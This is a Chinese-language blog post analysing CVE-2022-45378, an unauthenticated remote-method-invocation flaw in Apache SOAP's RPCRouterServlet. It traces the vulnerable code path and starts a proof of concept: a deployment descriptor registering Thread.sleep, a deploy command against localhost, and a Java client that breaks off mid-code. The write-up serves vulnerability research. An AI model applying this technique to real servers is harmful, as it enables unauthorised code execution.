<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言cve-2022-45378 是一个存在了接近20年的洞 (从 2024 年往回算的话)。在 maven 仓库可以看到最新的版本日期是 2005 年。这个组件是用于 soap 请求相关的。在很多年前就已经被替换了，至于为什么在 22 年才被发现这个洞，也不得而知。并且查找资料，几乎都是一个简单的漏洞编号，除此之外也没有什么细节 看一下 nist 的官方说明： 1In the default c">
<meta property="og:type" content="article">
<meta property="og:title" content="apache soap rce(cve-2022-45378)">
<meta property="og:url" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/">
<meta property="og:site_name" content="wude">
<meta property="og:description" content="前言cve-2022-45378 是一个存在了接近20年的洞 (从 2024 年往回算的话)。在 maven 仓库可以看到最新的版本日期是 2005 年。这个组件是用于 soap 请求相关的。在很多年前就已经被替换了，至于为什么在 22 年才被发现这个洞，也不得而知。并且查找资料，几乎都是一个简单的漏洞编号，除此之外也没有什么细节 看一下 nist 的官方说明： 1In the default c">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190406322.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190418734.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190430115.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190440711.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190514361.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190549230.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190607802.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190620851.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190633452.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190644517.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190653343.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190657347.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190706264.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190716181.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190725070.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190735007.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190746965.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190756964.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190806441.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190817934.png">
<meta property="og:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240607193755903.png">
<meta property="article:published_time" content="2024-07-07T11:03:46.000Z">
<meta property="article:modified_time" content="2024-07-07T11:09:10.698Z">
<meta property="article:author" content="wude">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190406322.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>apache soap rce(cve-2022-45378)</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/me">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Archive</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/07/07/%E4%BB%8E-xml-%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC-kcon-%E8%AE%AE%E9%A2%98%E8%A7%A3%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&text=apache soap rce(cve-2022-45378)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&title=apache soap rce(cve-2022-45378)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&is_video=false&description=apache soap rce(cve-2022-45378)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=apache soap rce(cve-2022-45378)&body=Check out this article: http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&title=apache soap rce(cve-2022-45378)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&title=apache soap rce(cve-2022-45378)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&title=apache soap rce(cve-2022-45378)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&title=apache soap rce(cve-2022-45378)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&name=apache soap rce(cve-2022-45378)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&t=apache soap rce(cve-2022-45378)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-poc"><span class="toc-number">3.</span> <span class="toc-text">构造 poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">另一种方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#more"><span class="toc-number">6.</span> <span class="toc-text">more</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.1.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jndi-%E6%B3%A8%E5%85%A5"><span class="toc-number">6.2.</span> <span class="toc-text">jndi 注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        apache soap rce(cve-2022-45378)
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wude</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-07-07T11:03:46.000Z" class="dt-published" itemprop="datePublished">2024-07-07</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>cve-2022-45378 是一个存在了接近20年的洞 (从 2024 年往回算的话)。在 maven 仓库可以看到最新的版本日期是 2005 年。这个组件是用于 soap 请求相关的。在很多年前就已经被替换了，至于为什么在 22 年才被发现这个洞，也不得而知。并且查找资料，几乎都是一个简单的漏洞编号，除此之外也没有什么细节</p>
<p>看一下 nist 的官方说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In the default configuration of Apache SOAP, an RPCRouterServlet is available without authentication. This gives an attacker the possibility to invoke methods on the classpath that meet certain criteria. Depending on what classes are available on the classpath this might even lead to arbitrary remote code execution. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</span><br></pre></td></tr></table></figure>

<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>从漏洞描述看，问题应该出在 <code>method.invoke</code> 方法可以传入被控的数据，而入口点就在 <code>RPCRouterServlet</code> ，直接从 github 上下载对应的源码，跳到该 servlet ：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190406322.png" alt="image-20240707190406322"></p>
<p>访问接口：<code>/soap/servlet/rpcrouter</code></p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190418734.png" alt="image-20240707190418734"></p>
<p>说明访问到了路径，不过漏洞触发需要用 post 。</p>
<p>知道了入口之后，搜一下对应 sink 点：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190430115.png" alt="image-20240707190430115"></p>
<p>结果不多，不过这里面还包含了非 <code>method.invoke</code> 的，用 jar-analyzer 试试：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190440711.png" alt="image-20240707190440711"></p>
<p>只有 11 个，排查后只有 <code>RPCRouter</code> 符合条件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">RPCRouter.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Response <span class="title function_">invoke</span><span class="params">(DeploymentDescriptor dd, Call call, Object targetObject, SOAPContext reqCtx, SOAPContext resCtx)</span> <span class="keyword">throws</span> SOAPException &#123;</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">params</span> <span class="operator">=</span> call.getParams();</span><br><span class="line">        Object[] args = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (params != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">paramsCount</span> <span class="operator">=</span> params.size();</span><br><span class="line">            args = <span class="keyword">new</span> <span class="title class_">Object</span>[paramsCount];</span><br><span class="line">            argTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[paramsCount];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; paramsCount; i++) &#123;</span><br><span class="line">                <span class="type">Parameter</span> <span class="variable">param</span> <span class="operator">=</span> (Parameter) params.elementAt(i);</span><br><span class="line">                args[i] = param.getValue();</span><br><span class="line">                argTypes[i] = param.getType();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Bean</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (providerType == DeploymentDescriptor.PROVIDER_JAVA ||</span><br><span class="line">                    providerType == DeploymentDescriptor.PROVIDER_USER_DEFINED) &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    m = MethodUtils.getMethod(targetObject,</span><br><span class="line">                            call.getMethodName(),</span><br><span class="line">                            argTypes);</span><br><span class="line">                &#125;</span><br><span class="line">                result = <span class="keyword">new</span> <span class="title class_">Bean</span>(m.getReturnType(), m.invoke(targetObject, args));</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>跟踪调用 invoke 的地方：<code>RPCJavaProvider.invoke</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">RPCJavaProvider.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(SOAPContext reqContext, SOAPContext resContext)</span> <span class="keyword">throws</span> SOAPException &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Response</span> <span class="variable">resp</span> <span class="operator">=</span> RPCRouter.invoke( dd, call, targetObject, </span><br><span class="line">                                          reqContext, resContext );</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">locate</span><span class="params">( DeploymentDescriptor dd,Envelope env,Call call,String methodName,String targetObjectURI,SOAPContext reqContext )</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.call            = call ;</span><br><span class="line">      targetObject = ServerHTTPUtils.getTargetObject (serviceManager,dd, targetObjectURI,servlet, session,reqContext,context);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>targetObject 在 <code>ServerHTTPUtils.getTargetObject</code> 初始化，跟进去：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ServerHTTPUtils.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTargetObject</span><span class="params">(ServiceManager serviceManager,</span></span><br><span class="line"><span class="params">                                         DeploymentDescriptor dd,</span></span><br><span class="line"><span class="params">                                         String targetID,</span></span><br><span class="line"><span class="params">                                         HttpServlet thisServlet,</span></span><br><span class="line"><span class="params">                                         HttpSession session,</span></span><br><span class="line"><span class="params">                                         SOAPContext ctxt,</span></span><br><span class="line"><span class="params">                                         ServletContext context)</span>&#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">providerType</span> <span class="operator">=</span> dd.getProviderType();</span><br><span class="line">        String className;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">targetObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        className = dd.getProviderClass();</span><br><span class="line">        <span class="keyword">if</span> (targetID.equals(ServerConstants.SERVICE_MANAGER_SERVICE_NAME)) &#123;</span><br><span class="line">            targetObject = serviceManager;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (targetObject == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> ctxt.loadClass(className);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (dd.getIsStatic()) &#123;</span><br><span class="line">                            targetObject = c;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            targetObject = c.newInstance();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>所以 targetObject 有两种可能，一种是 ServiceManager，一种是根据 deploy 时定义的 class，并且如果对应方法是 static 则直接返回 class，非 static 方法则返回实例化后的对象。</p>
<p>跟踪调用 <code>RPCJavaProvider.invoke</code> 的方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RPCRouterServlet.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span> <span class="params">(HttpServletRequest req, HttpServletResponse res)</span>&#123;</span><br><span class="line">    callEnv = ServerHTTPUtils.readEnvelopeFromRequest(xdb,</span><br><span class="line">                                                    req.getContentType(),</span><br><span class="line">                                                    req.getContentLength(),</span><br><span class="line">                                                    req.getInputStream(),</span><br><span class="line">                                                    editor,</span><br><span class="line">                                                    res,</span><br><span class="line">                                                    reqCtx);</span><br><span class="line">    </span><br><span class="line">    call = RPCRouter.extractCallFromEnvelope(serviceManager, callEnv,reqCtx);</span><br><span class="line">    targetID = call.getTargetObjectURI ();</span><br><span class="line">    dd = serviceManager.query (targetID);</span><br><span class="line">    provider = <span class="keyword">new</span> <span class="title class_">org</span>.apache.soap.providers.RPCJavaProvider();</span><br><span class="line"></span><br><span class="line">    provider.locate( dd, callEnv, call, call.getMethodName(), fullTargetID, reqCtx );</span><br><span class="line">    provider.invoke( reqCtx, resCtx );</span><br></pre></td></tr></table></figure>

<p>刚好到 <code>RPCRouterServlet.doPost</code> 方法，这样完整的链路就串起来了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RPCRouterServlet.doPost -&gt; RPCJavaProvider.invoke -&gt; RPCRouter.invoke -&gt; method.invoke </span><br></pre></td></tr></table></figure>

<p>剩下的就是参数部分了。其中 dd 包含了后续用到的 class 信息，跟进去 <code>serviceManager.query</code> 方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">serviceManager.java</span><br><span class="line"><span class="keyword">public</span> DeploymentDescriptor <span class="title function_">query</span><span class="params">(String id)</span> <span class="keyword">throws</span> SOAPException &#123;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (id.equals(ServerConstants.SERVICE_MANAGER_SERVICE_NAME))</span><br><span class="line">            <span class="keyword">return</span> smsdd;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">DeploymentDescriptor</span> <span class="variable">dd</span> <span class="operator">=</span> configMgr.query(id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BaseConfigManager.java</span><br><span class="line"><span class="keyword">public</span> DeploymentDescriptor <span class="title function_">query</span><span class="params">(String id)</span> <span class="keyword">throws</span> SOAPException &#123;</span><br><span class="line">    <span class="type">DeploymentDescriptor</span> <span class="variable">dd</span> <span class="operator">=</span> (DeploymentDescriptor) dds.get (id);</span><br><span class="line">    <span class="keyword">return</span>( dd );</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deploy</span><span class="params">( DeploymentDescriptor dd )</span> <span class="keyword">throws</span> SOAPException &#123;</span><br><span class="line">    <span class="type">String</span>  <span class="variable">id</span> <span class="operator">=</span> dd.getID();</span><br><span class="line">    dds.put( id, dd );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>查找调用 deploy 的方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ServiceManager.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deploy</span><span class="params">(DeploymentDescriptor dd)</span> <span class="keyword">throws</span> SOAPException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> dd.getID();</span><br><span class="line">        configMgr.deploy(dd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以如果要调用一个任意一个类的任意方法，就要先通过 <code>ServiceManager.deploy</code> 去注册对应的信息。回到 <code>ServerHTTPUtils.getTargetObject</code> 方法：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190514361.png" alt="image-20240707190514361"></p>
<p>整个链条就串起来了，<code>ServiceManager</code> 也是一个可以被调用的类，只要传入的 targetID 等于 <code>urn:xml-soap-service-management-service</code>。</p>
<h2 id="构造-poc"><a href="#构造-poc" class="headerlink" title="构造 poc"></a>构造 poc</h2><p>根据前面的说明，要实现任意方法调用需要两个步骤：</p>
<p>第一步：调用 <code>ServiceManager</code>  的 <code>deploy</code> 方法注册任意一个类和方法。</p>
<p>第二步：调用已经注册的类和方法完成任意方法调用。</p>
<p>现在唯一的问题是怎么构造这么一个 xml 的请求，参考：<a target="_blank" rel="noopener" href="https://www.oreilly.com/library/view/java-and-soap/0596001754/ch04.html">https://www.oreilly.com/library/view/java-and-soap/0596001754/ch04.html</a> 。</p>
<p>构造一个 sleep.dd：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">isd:service</span> </span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:isd</span>=<span class="string">&quot;http://xml.apache.org/xml-soap/deployment&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">id</span>=<span class="string">&quot;sleep&quot;</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">isd:provider</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">scope</span>=<span class="string">&quot;Request&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">methods</span>=<span class="string">&quot;sleep&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">isd:java</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Thread&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">static</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">isd:provider</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">isd:faultListener</span>&gt;</span></span><br><span class="line">   org.apache.soap.server.DOMFaultListener</span><br><span class="line">   <span class="tag">&lt;/<span class="name">isd:faultListener</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">isd:mappings</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">isd:mappings</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">isd:service</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后通过 <code>ServiceManagerClient</code>  完成部署：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java org.apache.soap.server.ServiceManagerClient http://localhost:8080/soap/servlet/rpcrouter deploy sleep.dd</span><br></pre></td></tr></table></figure>

<p>抓包看一下对应的请求内容：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190549230.png" alt="image-20240707190549230"></p>
<p>和上面介绍的一样，是通过调用 <code>ServiceManager</code> 的 <code>deploy</code> 方法完成部署。</p>
<p>同样的方式完成服务调用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSOAP</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8080/soap/servlet/rpcrouter&quot;</span>);</span><br><span class="line">    </span><br><span class="line">      <span class="type">Call</span> <span class="variable">call</span> 